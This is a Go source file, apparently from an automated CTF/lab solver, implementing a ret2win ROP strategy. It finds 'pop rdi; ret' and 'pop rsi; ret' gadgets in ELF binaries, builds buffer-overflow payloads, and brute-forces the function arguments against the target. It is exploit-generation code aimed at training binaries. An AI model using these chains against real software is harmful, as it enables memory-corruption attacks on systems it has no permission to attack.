package solve

import (
	"context"
	"debug/elf"
	"encoding/binary"
	"fmt"
	"strings"

	"github.com/MoriartyPuth/PwnProbes/internal/runner"
)

// maxRopAttempts bounds the two-argument ROP brute force.
const maxRopAttempts = 20000

// sentinel argument values used to locate a ret2win-with-arguments offset: they
// are distinctive, newline-free 64-bit words that a target echoing its
// parameters (printf("%lx")) will reproduce in its output, confirming the chain
// reached the function with controlled registers before the real keys are tried.
var (
	sentinelRDI uint64 = 0xdead1111cafe0001
	sentinelRSI uint64 = 0xbeef2222f00d0002
)

// ropRet2winArgsStrategy solves ret2win targets whose winning function takes two
// register arguments (System V: RDI, RSI) that must equal specific constants.
// It requires `pop rdi; ret` and `pop rsi; ret` gadgets, which such labs provide
// for exactly this purpose. For each padding length and candidate function it
// first sends a chain carrying sentinel arguments; only when the function echoes
// a sentinel (so the chain demonstrably reached it with controlled registers)
// does it brute-force the real argument pair from the magic constants in the
// binary. Both a direct call and a stack-aligned (extra ret) call are tried.
func (s *solver) ropRet2winArgsStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Protections["pie"].Status == "enabled" || bin.Bits != 64 {
		return false, nil // fixed 64-bit addresses only
	}
	f, err := elf.Open(s.path)
	if err != nil {
		return false, err
	}
	defer f.Close()

	popRDI, okRDI := findGadget(f, []byte{0x5f, 0xc3}) // pop rdi; ret
	popRSI, okRSI := findGadget(f, []byte{0x5e, 0xc3}) // pop rsi; ret
	if !okRDI || !okRSI {
		s.report.Limitations = append(s.report.Limitations, "no pop-rdi/pop-rsi gadgets found; two-argument ROP strategy skipped")
		return false, nil
	}
	ret, haveRet := retGadget(f)
	funcs := functionAddresses(bin)
	var args [][]byte
	lo, hi := loadableRange(f)
	for _, m := range scanMagics(f, lo, hi) {
		args = append(args, qword(uint64(m)))
	}
	if len(args) == 0 {
		return false, nil
	}

	attempts := 0
	over := func() bool {
		if attempts >= maxRopAttempts {
			s.report.Limitations = append(s.report.Limitations, fmt.Sprintf("ROP brute force stopped at the %d-attempt cap", maxRopAttempts))
			return true
		}
		return false
	}
	for _, pad := range paddingLengths() {
		for _, fn := range funcs {
			aligns := []bool{false}
			if haveRet {
				aligns = append(aligns, true)
			}
			for _, align := range aligns {
				if err := ctx.Err(); err != nil {
					return false, err
				}
				if over() {
					return false, nil
				}
				attempts++
				probe := ropChain(pad, popRDI, sentinelRDI, popRSI, sentinelRSI, align, ret, fn)
				result, runErr := runner.Run(ctx, runner.Request{Program: s.path, Input: probe, Timeout: s.timeout, WorkDir: s.workDir})
				if runErr != nil {
					return false, runErr
				}
				echoed := strings.Contains(strings.ToLower(result.Stdout), fmt.Sprintf("%x", sentinelRDI)) ||
					strings.Contains(strings.ToLower(result.Stdout), fmt.Sprintf("%x", sentinelRSI))
				if !echoed {
					continue
				}
				// Locked onto a function that consumes RDI/RSI at this offset and
				// alignment. Brute-force the real key pair from the constant pool.
				for _, a := range args {
					for _, b := range args {
						if err := ctx.Err(); err != nil {
							return false, err
						}
						if over() {
							return false, nil
						}
						attempts++
						payload := ropChainBytes(pad, popRDI, a, popRSI, b, align, ret, fn)
						note := fmt.Sprintf("padding=%d rdi=0x%x rsi=0x%x align=%v win=0x%x", pad, le64(a), le64(b), align, fn)
						if done, err := s.attempt(ctx, "rop_ret2win_args", note, payload, false); err != nil || done {
							return done, err
						}
					}
				}
			}
		}
	}
	return false, nil
}

func ropChain(pad int, popRDI, aVal, popRSI, bVal uint64, align bool, ret, fn uint64) []byte {
	return ropChainBytes(pad, popRDI, qword(aVal), popRSI, qword(bVal), align, ret, fn)
}

func ropChainBytes(pad int, popRDI uint64, a []byte, popRSI uint64, b []byte, align bool, ret, fn uint64) []byte {
	payload := make([]byte, 0, pad+64)
	for i := 0; i < pad; i++ {
		payload = append(payload, 'A')
	}
	payload = append(payload, qword(popRDI)...)
	payload = append(payload, a...)
	payload = append(payload, qword(popRSI)...)
	payload = append(payload, b...)
	if align {
		payload = append(payload, qword(ret)...)
	}
	payload = append(payload, qword(fn)...)
	return payload
}

func qword(v uint64) []byte {
	b := make([]byte, 8)
	binary.LittleEndian.PutUint64(b, v)
	return b
}

func le64(b []byte) uint64 {
	var buf [8]byte
	copy(buf[:], b)
	return binary.LittleEndian.Uint64(buf[:])
}

// findGadget returns the virtual address of the first occurrence of pattern in
// an executable section.
func findGadget(f *elf.File, pattern []byte) (uint64, bool) {
	for _, sec := range f.Sections {
		if sec.Type != elf.SHT_PROGBITS || sec.Flags&elf.SHF_EXECINSTR == 0 {
			continue
		}
		data, err := sec.Data()
		if err != nil {
			continue
		}
		for i := 0; i+len(pattern) <= len(data); i++ {
			match := true
			for j := range pattern {
				if data[i+j] != pattern[j] {
					match = false
					break
				}
			}
			if match {
				return sec.Addr + uint64(i), true
			}
		}
	}
	return 0, false
}
